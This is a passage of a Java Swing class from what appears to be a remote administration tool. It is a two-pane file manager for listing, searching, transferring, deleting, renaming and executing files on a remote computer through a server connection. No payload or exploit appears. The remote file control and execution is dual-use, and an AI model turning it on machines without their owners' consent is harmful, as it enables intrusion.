        barraRemotaAcciones.add(btnNuevaCarpetaRemota);
        barraRemotaAcciones.add(btnEliminarRemoto);
        barraRemotaAcciones.add(btnActualizarRemoto);

        //   PANEL DE INFO
        vistaPreviaRemoto = new JLabel();
        vistaPreviaRemoto.setIcon(Util.cargarIcono("/resources/nodisponible.png"));

        JPanel panelInfoArchivolRemoto = new JPanel();
        panelInfoArchivolRemoto.setLayout(new GridLayout(4, 2));
        panelInfoArchivolRemoto.add(GuiUtil.crearJLabel("Nombre:", "Nombre del archivo"));

        lblInfoNombreRemoto = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolRemoto.add(lblInfoNombreRemoto);
        panelInfoArchivolRemoto.add(GuiUtil.crearJLabel("Tipo:", "Tipo del archivo"));
        lblInfoTipoRemoto = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolRemoto.add(lblInfoTipoRemoto);
        panelInfoArchivolRemoto.add(GuiUtil.crearJLabel("Tamaño:", "Tamaño del archivo"));
        lblInfoTamanioRemoto = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolRemoto.add(lblInfoTamanioRemoto);
        panelInfoArchivolRemoto.add(GuiUtil.crearJLabel("Fecha:", "Fecha de modificación del archivo"));
        lblInfoFechaRemoto = GuiUtil.crearJLabel("--", "--");
        panelInfoArchivolRemoto.add(lblInfoFechaRemoto);

        panelInfoRemoto = new JPanel();
        panelInfoRemoto.setLayout(new BorderLayout());
        panelInfoRemoto.add(vistaPreviaRemoto, BorderLayout.WEST);

        panelInfoRemoto.add(panelInfoArchivolRemoto, BorderLayout.CENTER);
        this.panelInfoRemoto.setBorder(BorderFactory.createTitledBorder(null, "Información", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));

        JPanel barrasRemotas = new JPanel();
        barrasRemotas.setLayout(new BorderLayout());
        barrasRemotas.add(barraRemotaUnidad, BorderLayout.NORTH);
        barrasRemotas.add(barraRemotaRuta, BorderLayout.CENTER);
        barrasRemotas.add(barraRemotaAcciones, BorderLayout.SOUTH);
        panelRemoto.setLayout(new BorderLayout());
        panelRemoto.add(barrasRemotas, BorderLayout.NORTH);
        panelRemoto.add(scrollTablaRemota, BorderLayout.CENTER);
    }

    //#######################################################################
    //                      PANEL DE BUSQUEDA
    //#######################################################################
    private JPanel panelBusqueda() {
        lblCriterio = new JLabel();
        lblLugar = new JLabel();

        criterioBusqueda = new JTextField();
        lugarBusqueda = new JTextField();
        btnBuscar = new JToggleButton();
        btnLimpiarBusqueda = new JButton();

        btnBuscar.setIcon(Util.cargarIcono16("/resources/search.png"));
        this.btnBuscar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnBuscarAP(evt);
            }
        });
        btnLimpiarBusqueda.setIcon(Util.cargarIcono16("/resources/clear.png"));
        btnLimpiarBusqueda.setToolTipText("Limpia la tabla de resultados");
        this.btnLimpiarBusqueda.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                AdminArchivos.this.btnLimpiarAP(evt);
            }
        });
        JPanel panelCriterio = new JPanel();
        this.lblCriterio.setText("Nombre archivo:");
        this.lblLugar.setText("Carpeta a buscar:");
        criterioBusqueda.setText("*.*");
        lugarBusqueda.setText("/");
        panelCriterio.setLayout(new GridLayout(3, 2));
        panelCriterio.add(lblCriterio);
        panelCriterio.add(criterioBusqueda);
        panelCriterio.add(lblLugar);
        panelCriterio.add(lugarBusqueda);
        panelCriterio.add(btnBuscar);
        panelCriterio.add(btnLimpiarBusqueda);
        JPanel panelBuscar = new JPanel();
        tablaResultados = new JTable();
        tablaResultados.setShowGrid(false);
        this.tablaResultados.setComponentPopupMenu(this.menu2);
        this.tablaResultados.setAutoCreateRowSorter(true);
        this.tablaResultados.setFont(new Font(tipoLetra, 1, 14));
//         this.tablaRemota.setRowHeight(100);
        this.tablaResultados.setModel(new DefaultTableModel(new Object[0][], new String[]{"Nombre", "Tipo", "Tamaño", "Ubicacion"}) {
            boolean[] canEdit = {false, false, false, false};

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tablaResultados.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
                AdminArchivos.this.tablaResultadoClicked(evt);
            }

            public void mousePressed(MouseEvent evt) {
                AdminArchivos.this.tablaResultadoMousePressed(evt);
            }
        });
        this.scrollTablaResultado.setViewportView(this.tablaResultados);
        JPanel cont = new JPanel();
        cont.setLayout(new GridLayout(1, 1));
        cont.add(scrollTablaResultado);
        panelBuscar.setLayout(new BorderLayout());
        panelBuscar.add(cont, BorderLayout.CENTER);
        panelBuscar.add(panelCriterio, BorderLayout.NORTH);
        return panelBuscar;
    }

    private void btnListarDrivesAP(ActionEvent evt) {
        servidor.listarDrives();
    }

    private Archivo[] listar(String ruta) {
        File t = new File(ruta);
        Archivo[] a = null;
        if (t.isDirectory()) {
            File[] ar = t.listFiles();
            if (ar != null) {
                if (ar.length > 0) {
                    a = new Archivo[ar.length];
                    for (int p = 0; p < ar.length; p++) {
                        a[p] = new Archivo();
                        a[p].setLength(ar[p].length());
                        a[p].setNombre(ar[p].getName());
                        a[p].setCarpeta(ar[p].isDirectory());
                        a[p].setPath(ar[p].getAbsolutePath());
                        a[p].setTipo(Util.getExtension(ar[p].getName()));
                        a[p].setFecha(ar[p].lastModified());
                        a[p].setIcono(Util.sacarIcono(ar[p]));
                        String m = ar[p].getParent();
                        m = m.replace("\\", "/");
                        a[p].setPathParent(m);
                    }
                } else {
                    a = null;
                }
            } else {
                a = null;
            }
        }
        if (t.isFile()) {
            a = null;
        }
        return a;
    }

    private Archivo[] listarUnidades() {
        Archivo[] a;
        File[] ar = File.listRoots();
        if (ar != null) {
            if (ar.length > 0) {
                a = new Archivo[ar.length];
                for (int p = 0; p < ar.length; p++) {
                    a[p] = new Archivo();
                    a[p].setLength(ar[p].length());
                    a[p].setNombre(ar[p].getName());
                    a[p].setCarpeta(ar[p].isDirectory());
                    a[p].setPath(ar[p].getAbsolutePath());
                    a[p].setTipo(Util.getExtension(ar[p].getName()));
                    a[p].setFecha(ar[p].lastModified());
                    a[p].setIcono(Util.sacarIcono2(ar[p]));
                    a[p].setLibre(ar[p].getFreeSpace());
                    a[p].setTamanio(ar[p].getTotalSpace());
                    a[p].setPathParent("");
                }
            } else {
                a = null;
            }
        } else {
            a = null;
        }
        return a;
    }

    private void btnListarDrivesLocalAP(ActionEvent evt) {
        Archivo[] unid = listarUnidades();
        if (unid != null) {
            ImageIcon[] unitmp = new ImageIcon[unid.length];
            for (int i = 0; i < unitmp.length; i++) {
                if (unid[i].getIcono() != null) {
                    ImageIcon item = new ImageIcon(unid[i].getIcono());
                    item.setDescription(Util.armarNombreUnidad(unid[i]));
                    unitmp[i] = item;
                } else {
                    ImageIcon item = Util.cargarIcono16("/resources/folder.png");
                    item.setDescription(Util.armarNombreUnidad(unid[i]));
                    unitmp[i] = item;
                }
            }
            this.unidadesLocales = unitmp;
            unidadLocal.removeAllItems();
            for (int i = 0; i < unitmp.length; i++) {
                this.unidadLocal.addItem(i);
            }
        }
    }

    private void btnBuscarAP(ActionEvent evt) {
        if (this.btnBuscar.isSelected()) {
            btnBuscar.setIcon(Util.cargarIcono16("/resources/stop_close.png"));
            servidor.buscarArchivos(this.criterioBusqueda.getText(), this.lugarBusqueda.getText());
        } else {
            btnBuscar.setIcon(Util.cargarIcono16("/resources/search.png"));
            servidor.detenerBusqueda();
        }
    }

    private void btnLimpiarAP(ActionEvent evt) {
        for (int i = this.tablaResultados.getRowCount() - 1; i > -1; i--) {
            this.modelotablaResultados.removeRow(i);
        }
    }

    private String getRutaActual() {
//        return this.unidadRemota.getSelectedItem().toString() + tmpRuta;
        try {
            if (this.getRutaRemota().getText().equals("")) {
                return this.unidadRemota.getSelectedItem().toString();
            } else {
                return this.getRutaRemota().getText();
            }
        } catch (Exception e) {
            return ".";
        }
    }

    private void btnListarAP(ActionEvent evt) {
        this.actualizarListaRemota();
    }

    private void listarLocal(String ruta) {
        Archivo[] archivo = listar(ruta);
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        this.limpiaTablaLocal();
//            this.modeloTablaLocal.addRow(new String[]{"..", ".."});
        this.modeloTablaLocal.addRow(new Object[]{new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
        // por si acaso el directorio este vacio
        this.txtRutaLocal.setText(ruta);
        if (archivo != null) {
            for (Archivo p : archivo) {
                modeloTablaLocal.addRow(new Object[]{
                    new CampoIcono(p.getIcono() != null ? p.getIcono() : (p.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), p.getNombre()),
                    p.isCarpeta() ? "(Carpeta)" : p.getTipo(),
                    p.getLength(),
                    sdf.format(new Date(p.getFecha()))
                });
            }
            this.txtRutaLocal.setText(archivo[0].getPathParent().replace(this.sep + "..", ""));
            if (archivo[0].getPathParent().contains(this.sep + "..")) {
                if (!this.txtRutaLocal.getText().contains(this.sep)) {
                    this.txtRutaLocal.setText("");
                } else {
                    this.txtRutaLocal.setText(this.txtRutaLocal.getText().substring(0, this.txtRutaLocal.getText().lastIndexOf(this.sep)) + this.sep);
                    
                }
            }
        }
        this.repaint();
    }

    private void btnListarLocalAP(ActionEvent evt) {
        listarLocal(this.txtRutaLocal.getText());
    }

    public void actualizarListaRemota() {
        this.limpiaTablaRemota();
        servidor.listar(this.getRutaActual());
    }

    public void actualizarListaLocal() {
        this.limpiaTablaLocal();
        this.btnListarLocalAP(null);
    }

    public JComboBox getUnidad() {
        return unidadRemota;
    }

    public void setUnidad(JComboBox unidad) {
        this.unidadRemota = unidad;
    }

    public JTable getTabla() {
        return tablaRemota;
    }

    public void setTabla(JTable tabla) {
        this.tablaRemota = tabla;
    }

    public DefaultTableModel getModelotabla() {
        return modeloTablaRemota;
    }

    public void setModelotabla(DefaultTableModel modelotabla) {
        this.modeloTablaRemota = modelotabla;
    }
//    public ModeloTabla getModelotabla() {
//        return modeloTablaRemota;
//    }
//
//    public void setModelotabla(ModeloTabla modeloTablaRemota) {
//        this.modeloTablaRemota = modeloTablaRemota;
//    }

    public void limpiaTablaRemota() {
        for (int i = this.tablaRemota.getRowCount() - 1; i > -1; i--) {
            this.modeloTablaRemota.removeRow(i);
        }
    }

    public void limpiaTablaLocal() {
        for (int i = this.tablaLocal.getRowCount() - 1; i > -1; i--) {
            this.modeloTablaLocal.removeRow(i);
        }
    }

    public JTextField getRutaRemota() {
        return txtRutaRemota;
    }

    public void setRuta(JTextField ruta) {
        this.txtRutaRemota = ruta;
    }

    private void tablaLocalMouseClick(MouseEvent evt) {
        try {
            if ((evt.getButton() == 1) && (evt.getClickCount() == 2)) {
                this.seleccionadoLocal = ((CampoIcono) this.tablaLocal.getValueAt(this.tablaLocal.getSelectedRow(), 0)).getNombre();
                if ((!this.txtRutaLocal.getText().contains("/")) && (this.txtRutaLocal.getText().isEmpty())) {
                    this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.seleccionadoLocal);
                } else {
                    this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.sep + this.seleccionadoLocal);
                }
//            servidor.listar(unidadRemota + this.rutaPosterior);
//            servidor.listar(this.rutaPosterior);
                listarLocal(rutaPosteriorLocal);
            }
            if ((evt.getButton() == 1) && (evt.getClickCount() == 1)) {
                this.seleccionadoLocal = ((CampoIcono) this.tablaLocal.getValueAt(this.tablaLocal.getSelectedRow(), 0)).getNombre();
                if ((!this.txtRutaLocal.getText().contains("/")) && (this.txtRutaLocal.getText().isEmpty())) {
                    this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.seleccionadoLocal);
                } else {
                    this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.sep + this.seleccionadoLocal);
                }
//            servidor.pedirThumbail(rutaPosterior);
                vistaPreviaLocal.setIcon(Util.cargarIcono("/resources/nodisponible.png"));
                mostrarInfoArchivoLocal(rutaPosteriorLocal);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void mostrarInfoArchivoLocal(String ruta) {
        try {
            File file = new File(ruta);
            String nombre = file.getName().toLowerCase();
            if ((file.isFile()) && ((nombre.contains(".jpg")) || (nombre.contains(".png"))
                    || (nombre.contains(".jpeg")) || (nombre.contains(".gif")) || (nombre.contains(".ico"))
                    || (nombre.contains(".bmp")))) {
                try {
                    ImageIcon fot = new ImageIcon(Util.sacarThumbailBI(file));
                    vistaPreviaLocal.setIcon(fot);
                    //servicio.ADMIN_ARCHIVOS_EJECUTAR(8, rt.utilidades.Protocolo.ADMIN_ARCHIVOS_THUMBAIL, UtilRT.comprimirGZIP(ara.toByteArray()));
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            } else {//si no es imagen muestro el icono
                try {
                    //ImageIcon fot = new ImageIcon(Util.sacarIcono(file));

                    ImageIcon fot = new ImageIcon(new ImageIcon(Util.sacarIcono(file)).getImage().getScaledInstance(48, 48, Image.SCALE_SMOOTH));
//                   ImageIcon fot =new ImageIcon(Util.sacarIcono(file));

                    vistaPreviaLocal.setIcon(fot);
                } catch (Exception e) {
                    if (file.isDirectory()) {
                        ImageIcon fot = new ImageIcon(Util.obtenerBytes(Util.cargarIcono("/resources/folder.png", 48, 48)));
                        vistaPreviaLocal.setIcon(fot);
                    } else {
                        ImageIcon fot = new ImageIcon(Util.obtenerBytes(Util.cargarIcono("/resources/file.png", 48, 48)));
                        vistaPreviaLocal.setIcon(fot);
                    }

                    //e.printStackTrace();
                }
            }

            lblInfoNombreLocal.setText(file.getName());
            if (file.isDirectory()) {
                lblInfoTipoLocal.setText("(Carpeta)");
            } else {
                lblInfoTipoLocal.setText(Util.getExtension(file.getName()));
            }

            lblInfoTamanioLocal.setText(Util.convertirBytes(file.length()));
            lblInfoFechaLocal.setText(new SimpleDateFormat("yyyy/MM/dd HH:mm:ss").format(new Date(file.lastModified())));

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void tablaLocalMousePressed(MouseEvent evt) {
        if (this.tablaLocal.getSelectedRowCount() <= 1) {
            int t = this.tablaLocal.rowAtPoint(evt.getPoint());
            this.tablaLocal.getSelectionModel().setSelectionInterval(t, t);
        }
    }

    private void tablaRemotaMouseClick(MouseEvent evt) {
        try {
            if ((evt.getButton() == 1) && (evt.getClickCount() == 2)) {
                this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(this.tablaRemota.getSelectedRow(), 0)).getNombre();
//                if ((!this.txtRutaRemota.getText().contains("/")) && (this.txtRutaRemota.getText().isEmpty())) {
                if (this.txtRutaRemota.getText().endsWith("/")) {
                    this.rutaPosterior = (this.txtRutaRemota.getText() + this.seleccionado);
                } else {
                    this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
                }
                this.limpiaTablaRemota();

                txtRutaRemota.setText(rutaPosterior);
                servidor.listar(this.rutaPosterior);
            }
            if ((evt.getButton() == 1) && (evt.getClickCount() == 1)) {
                CampoIcono cSeleccionado = ((CampoIcono) this.tablaRemota.getValueAt(this.tablaRemota.getSelectedRow(), 0));
                this.seleccionado = cSeleccionado.getNombre();
                //if ((!this.txtRutaRemota.getText().contains("/")) && (this.txtRutaRemota.getText().isEmpty())) {
                if (this.txtRutaRemota.getText().endsWith("/")) {
                    this.rutaPosterior = (this.txtRutaRemota.getText() + this.seleccionado);
                } else {
                    this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
                }
                vistaPreviaRemoto.setIcon(Util.cargarIcono("/resources/nodisponible.png"));
                try {
                    ImageIcon fot = new ImageIcon(new ImageIcon(cSeleccionado.getIcono()).getImage().getScaledInstance(48, 48, Image.SCALE_SMOOTH));
                    vistaPreviaRemoto.setIcon(fot);
                    lblInfoNombreRemoto.setText(seleccionado);
                    lblInfoTipoRemoto.setText((String) this.tablaRemota.getValueAt(this.tablaRemota.getSelectedRow(), 1));
                    lblInfoTamanioRemoto.setText(Util.convertirBytes((Long) this.tablaRemota.getValueAt(this.tablaRemota.getSelectedRow(), 2)));
                    lblInfoFechaRemoto.setText((String) this.tablaRemota.getValueAt(this.tablaRemota.getSelectedRow(), 3));
                } catch (Exception e) {
                }
//                  new CampoIcono(p.getIcono() != null ? p.getIcono() : (p.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), p.getNombre()),
//                    p.isCarpeta() ? "(Carpeta)" : p.getTipo(),
//                    p.getLength(),
//                    sdf.format(new Date(p.getFecha()))
                servidor.pedirThumbail(rutaPosterior);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void tablaRemotaMousePressed(MouseEvent evt) {
        if (this.tablaRemota.getSelectedRowCount() <= 1) {
            int t = this.tablaRemota.rowAtPoint(evt.getPoint());
            this.tablaRemota.getSelectionModel().setSelectionInterval(t, t);
        }
    }

    private void tablaResultadoClicked(MouseEvent evt) {

        if ((evt.getButton() == 1) && (evt.getClickCount() == 1)) {
            CampoIcono cSeleccionado = ((CampoIcono) this.tablaResultados.getValueAt(this.tablaResultados.getSelectedRow(), 0));
            String ruta = ((String) this.tablaResultados.getValueAt(this.tablaResultados.getSelectedRow(), 3));
            this.seleccionado = cSeleccionado.getNombre();
            if (ruta.endsWith("/")) {
                this.rutaPosterior = (ruta + this.seleccionado);
            } else {
                this.rutaPosterior = (ruta + this.sep + this.seleccionado);
            }
            vistaPreviaRemoto.setIcon(Util.cargarIcono("/resources/nodisponible.png"));
            try {
//                    ImageIcon fot = new ImageIcon(cSeleccionado.getIcono());

                ImageIcon fot = new ImageIcon(new ImageIcon(cSeleccionado.getIcono()).getImage().getScaledInstance(48, 48, Image.SCALE_SMOOTH));

                vistaPreviaRemoto.setIcon(fot);
                lblInfoNombreRemoto.setText(seleccionado);
                lblInfoTipoRemoto.setText((String) this.tablaResultados.getValueAt(this.tablaResultados.getSelectedRow(), 1));
                lblInfoTamanioRemoto.setText(Util.convertirBytes((Long) this.tablaResultados.getValueAt(this.tablaResultados.getSelectedRow(), 2)));
                //lblInfoFechaRemoto.setText((String) this.tablaResultados.getValueAt(this.tablaResultados.getSelectedRow(), 3));
            } catch (Exception e) {
            }

            servidor.pedirThumbail(rutaPosterior);
        }

    }

    private void tablaResultadoMousePressed(MouseEvent evt) {
        if (this.tablaResultados.getSelectedRowCount() <= 1) {
            int t = this.tablaResultados.rowAtPoint(evt.getPoint());
            this.tablaResultados.getSelectionModel().setSelectionInterval(t, t);
        }
    }

    private void unidadLocalAP(ActionEvent evt) {
        try {
            this.txtRutaLocal.setText(Util.getNombreUnidad(unidadesLocales[(int) unidadLocal.getSelectedItem()].getDescription()));
        } catch (Exception e) {
        }
        this.actualizarListaLocal();
//        this.rutaRemota.setText(unidadRemota.getSelectedItem().toString());
    }

    private void unidadAP(ActionEvent evt) {
        try {
            this.txtRutaRemota.setText(Util.getNombreUnidad(unidadesRemotas[(int) unidadRemota.getSelectedItem()].getDescription()));
        } catch (Exception e) {
        }
        this.actualizarListaRemota();
//        this.rutaRemota.setText(unidadRemota.getSelectedItem().toString());
    }

    private void btnDescargaActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            servidor.descargar(rutaPosterior, txtRutaLocal.getText());
        }
    }

    private void descargaActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            servidor.descargar(rutaPosterior, "");
        }
    }

    private void descargaTablaResultadoActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaResultados.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaResultados.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (((String) this.tablaResultados.getValueAt(selec[i], 3)) + this.sep + this.seleccionado);

            CampoIcono cSeleccionado = ((CampoIcono) this.tablaResultados.getValueAt(selec[i], 0));
            String ruta = ((String) this.tablaResultados.getValueAt(selec[i], 3));
            this.seleccionado = cSeleccionado.getNombre();
            if (ruta.endsWith("/")) {
                this.rutaPosterior = (ruta + this.seleccionado);
            } else {
                this.rutaPosterior = (ruta + this.sep + this.seleccionado);
            }
            servidor.descargar(rutaPosterior, "");

        }
    }

    //copiar
    private void copiarAP(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        archivosACopiar.clear();
        tipoAccionPortapaleles = COPIAR;
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            archivosACopiar.add(rutaPosterior + "::::" + this.seleccionado);
            //servidor.moverArchivo(rutaPosterior, this.txtRutaRemota.getText() + this.sep + nombre);
        }

    }
    //CORTAR

    private void cortarAP(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        archivosACopiar.clear();
        tipoAccionPortapaleles = CORTAR;
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            archivosACopiar.add(rutaPosterior + "::::" + this.seleccionado);
            //servidor.moverArchivo(rutaPosterior, this.txtRutaRemota.getText() + this.sep + nombre);
        }

    }

    //pegar
    private void pegarAP(ActionEvent evt) {
        String[] partes;
        for (String archivoOrigen : archivosACopiar) {
            partes = archivoOrigen.split("::::");
            if (tipoAccionPortapaleles == COPIAR) {
                servidor.copiarArchivo(partes[0], this.txtRutaRemota.getText() + this.sep + partes[1]);
            } else if (tipoAccionPortapaleles == CORTAR) {
                servidor.moverArchivo(partes[0], this.txtRutaRemota.getText() + this.sep + partes[1]);
            }
        }
    }

    private void renombrararchivoAP(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        if (selec.length > 1) {
//            new Thread(new Runnable() {
//                public void run() {
            JOptionPane.showMessageDialog(null, "Solo debe seleccionar 1 archivo", "Error", JOptionPane.ERROR_MESSAGE);
//                }
//            }
//            ).start();
        } else {

            //String nombre = JOptionPane.showInputDialog(null, "Nuevo Nombre : ", "Renombrar archivo", 1);
            for (int i = 0; i < selec.length; i++) {

                this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();

                String nombre = JOptionPane.showInputDialog("Nuevo Nombre : ", this.seleccionado);

                this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
                servidor.moverArchivo(rutaPosterior, this.txtRutaRemota.getText() + this.sep + nombre);
            }
        }
        actualizarListaRemota();
    }

    private void comprimirActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            servidor.comprimir(rutaPosterior);
        }
    }

    private void subirActionPerformed(ActionEvent evt) {
        JFileChooser cd = new JFileChooser();
        cd.setFileSelectionMode(JFileChooser.FILES_ONLY);
        cd.setMultiSelectionEnabled(true);
        if (cd.showOpenDialog(null) == 0) {
            File[] files = cd.getSelectedFiles();
            for (int i = 0; i < files.length; i++) {
                String archivo = "";
                archivo = files[i].getAbsolutePath();
                this.servidor.subirArchivo(archivo, this.txtRutaRemota.getText());
            }
        }
    }

    private void eliminarLocalActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaLocal.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            String selecc = ((CampoIcono) this.tablaLocal.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.sep + selecc);
            new File(rutaPosteriorLocal).delete();
        }
        actualizarListaLocal();
    }

    private void bntSubirActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaLocal.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            String selecc = ((CampoIcono) this.tablaLocal.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosteriorLocal = (this.txtRutaLocal.getText() + this.sep + selecc);
            this.servidor.subirArchivo(rutaPosteriorLocal, this.txtRutaRemota.getText());
        }
    }

    private void eliminarActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            servidor.eliminar(rutaPosterior);
        }
        this.actualizarListaRemota();
    }

    private void eliminar2ActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaResultados.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            CampoIcono cSeleccionado = ((CampoIcono) this.tablaResultados.getValueAt(selec[i], 0));
            String ruta = ((String) this.tablaResultados.getValueAt(selec[i], 3));
            this.seleccionado = cSeleccionado.getNombre();
            if (ruta.endsWith("/")) {
                this.rutaPosterior = (ruta + this.seleccionado);
            } else {
                this.rutaPosterior = (ruta + this.sep + this.seleccionado);
            }

            servidor.eliminar(rutaPosterior);
        }
        this.actualizarListaRemota();
    }

    private void crearCarpetaActionPerformed(ActionEvent evt) {
        String carpeta = JOptionPane.showInputDialog(null, "Nombre de Carpeta : ",
                "Crear Carpeta Equipo Remoto", 1);
        this.servidor.crearCarpeta(carpeta, this.txtRutaRemota.getText());
        this.actualizarListaRemota();
    }

    private void crearCarpetaLocalActionPerformed(ActionEvent evt) {
        String carpeta = JOptionPane.showInputDialog(null, "Nombre de Carpeta : ",
                "Crear Carpeta", 1);
        File nueva = new File(txtRutaLocal.getText(), carpeta);

        if (!nueva.exists()) {
            nueva.mkdir();
        }
        this.actualizarListaLocal();
    }

    private void ejecutarActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaRemota.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = ((CampoIcono) this.tablaRemota.getValueAt(selec[i], 0)).getNombre();
            this.rutaPosterior = (this.txtRutaRemota.getText() + this.sep + this.seleccionado);
            servidor.ejecutar(rutaPosterior);
        }
    }

    private void listarHomeRemoto(ActionEvent evt) {
        servidor.enviarComando(Protocolo.ADMIN_ARCHIVOS_LISTAR_HOME);
    }

    private void ejecutar2ActionPerformed(ActionEvent evt) {
        int[] selec = this.tablaResultados.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {

            CampoIcono cSeleccionado = ((CampoIcono) this.tablaResultados.getValueAt(selec[i], 0));
            String ruta = ((String) this.tablaResultados.getValueAt(selec[i], 3));
            this.seleccionado = cSeleccionado.getNombre();
            if (ruta.endsWith("/")) {
                this.rutaPosterior = (ruta + this.seleccionado);
            } else {
                this.rutaPosterior = (ruta + this.sep + this.seleccionado);
            }
            servidor.ejecutar(rutaPosterior);

        }
    }

    static class CeldaTamanio extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            if (value == null) {
                setText("");
            } else {
                long peso = Long.valueOf(value.toString());
                setText(Util.convertirBytes(peso));
            }
        }
    }

    static class CeldaIcono extends DefaultTableCellRenderer {

        @Override
        public void setValue(Object value) {
            try {
                CampoIcono campo = (CampoIcono) value;
                if (campo == null) {
                    setText("N/A");
                } else {
                    if (campo.getIcono() != null) {
                        try {
                            setIcon(new ImageIcon(new ImageIcon(campo.getIcono()).getImage().getScaledInstance(16, 16, Image.SCALE_SMOOTH)));
                        } catch (Exception e) {
                            setText("Error");
                        }
                    }
                    setText(campo.getNombre());
                }
            } catch (Exception e) {
                setText("ERROR:" + value.toString());
            }
        }
    }

    public static String guardarIcono(byte[] datos, String nombre) {
        if (datos != null) {
            File file = new File(nombre);
            try {
                file.delete();
            } catch (Exception e) {
            }
            try {
                file.createNewFile();
                FileOutputStream fout = new FileOutputStream(file);
                fout.write(datos);
                fout.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return nombre;

    }

    public class ComboBoxRemotoRenderer extends JLabel
            implements ListCellRenderer {

        public ComboBoxRemotoRenderer() {
            setOpaque(true);
            setHorizontalAlignment(CENTER);
            setVerticalAlignment(CENTER);
        }

        /*
         * This method finds the image and text corresponding
         * to the selected value and returns the label, set up
         * to display the text and image.
         */
        @Override
        public Component getListCellRendererComponent(
                JList list,
                Object value,
                int index,
                boolean isSelected,
                boolean cellHasFocus) {
            try {
                int selectedIndex = ((Integer) value).intValue();
                if (isSelected) {
                    setBackground(list.getSelectionBackground());
                    setForeground(list.getSelectionForeground());
                } else {
                    setBackground(list.getBackground());
                    setForeground(list.getForeground());
                }
                //Set the icon and text.  If icon was null, say so.
                ImageIcon icon = new ImageIcon(unidadesRemotas[selectedIndex].getImage().getScaledInstance(16, 16, Image.SCALE_SMOOTH));
                String texto = unidadesRemotas[selectedIndex].getDescription();
                setIcon(icon);
                if (icon != null) {
                    setText(texto);
//                setFont(list.getFont());
                } else {
                    setText("");
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
            return this;
        }
    }

    public class ComboBoxLocalRenderer extends JLabel
            implements ListCellRenderer {

        public ComboBoxLocalRenderer() {
            setOpaque(true);
            setHorizontalAlignment(CENTER);
